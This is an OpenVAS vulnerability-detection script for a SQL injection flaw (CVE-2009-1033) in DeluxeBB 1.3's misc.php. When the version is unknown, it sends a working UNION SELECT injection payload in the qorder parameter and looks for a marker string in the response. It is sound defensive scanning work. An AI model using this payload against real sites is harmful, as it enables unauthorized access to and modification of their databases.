###############################################################################
# OpenVAS Vulnerability Test
# $Id: deluxeBB_1_3.nasl 7176 2017-09-18 12:01:01Z cfischer $
#
# DeluxeBB 'misc.php' SQL Injection Vulnerability
#
# Authors:
# Michael Meyer
#
# Copyright:
# Copyright (c) 2009 Greenbone Networks GmbH
#
# This program is free software; you can redistribute it and/or modify
# it under the terms of the GNU General Public License version 2
# (or any later version), as published by the Free Software Foundation.
#
# This program is distributed in the hope that it will be useful,
# but WITHOUT ANY WARRANTY; without even the implied warranty of
# MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
# GNU General Public License for more details.
#
# You should have received a copy of the GNU General Public License
# along with this program; if not, write to the Free Software
# Foundation, Inc., 51 Franklin St, Fifth Floor, Boston, MA 02110-1301 USA.
###############################################################################

tag_summary = "DeluxeBB is prone to an SQL-injection vulnerability because it fails
  to sufficiently sanitize user-supplied data before using it in an
  SQL query.

  Exploiting this issue could allow an attacker to compromise the
  application, access or modify data, or exploit latent
  vulnerabilities in the underlying database.

  DeluxeBB 1.3 and earlier versions are vulnerable.";

tag_solution = "Upgrade to newer Version if available.";


if (description)
{
 script_id(100064);
 script_version("$Revision: 7176 $");
 script_tag(name:"last_modification", value:"$Date: 2017-09-18 14:01:01 +0200 (Mon, 18 Sep 2017) $");
 script_tag(name:"creation_date", value:"2009-03-20 11:01:53 +0100 (Fri, 20 Mar 2009)");
 script_tag(name:"cvss_base", value:"7.5");
 script_tag(name:"cvss_base_vector", value:"AV:N/AC:L/Au:N/C:P/I:P/A:P");
 script_cve_id("CVE-2009-1033");
 script_bugtraq_id(34174);

 script_name("DeluxeBB 'misc.php' SQL Injection Vulnerability");
 script_category(ACT_GATHER_INFO);
  script_tag(name:"qod_type", value:"remote_banner");
 script_family("Web application abuses");
 script_copyright("This script is Copyright (C) 2009 Greenbone Networks GmbH");
 script_dependencies("deluxeBB_detect.nasl");
 script_require_ports("Services/www", 80);
 script_exclude_keys("Settings/disable_cgi_scanning");
 script_tag(name : "solution" , value : tag_solution);
 script_tag(name : "summary" , value : tag_summary);
 script_xref(name : "URL" , value : "http://www.securityfocus.com/bid/34174");
 script_xref(name : "URL" , value : "http://www.deluxebb.com/");
 exit(0);
}

include("http_func.inc");
include("http_keepalive.inc");
include("version_func.inc");

port = get_http_port(default:80);
if (!get_port_state(port)) exit(0);
if (!can_host_php(port:port)) exit(0);

install = get_kb_item(string("www/", port, "/deluxeBB"));
if (isnull(install)) exit(0);

matches = eregmatch(string:install, pattern:"^(.+) under (/.*)$");

if (!isnull(matches[1])) {
	version = matches[1];
	if(version != "unknown") { 
	  if (version_is_less_equal(version:version, test_version:"1.3") ) { 
	     security_message(port);
	     exit(0);
	  }
	} else {

	 if(!isnull(matches[2])) {

	   dir = matches[2];
	   url = string(dir, "/misc.php?sub=memberlist&order=1&qorder=UNION+ALL+SELECT+1,2,3,4,5,6,7,8,9,10,11,12,13,14,0x4f70656e5641532d53514c2d496e6a656374696f6e2d54657374,16,17,18,19,20,21,22,23,24,25,26,27,28,29%23&sort=ASC&filter=all&searchuser=.&submit=1");
	   req = http_get(item:url, port:port);
           buf = http_keepalive_send_recv(port:port, data:req, bodyonly:FALSE);  
	   if( buf == NULL )exit(0);
	  
	   if(egrep(pattern: "OpenVAS-SQL-Injection-Test", string: buf)) {

	     security_message(port:port);
	     exit(0);

	   }  
	 }
      }	  
}

exit(0);
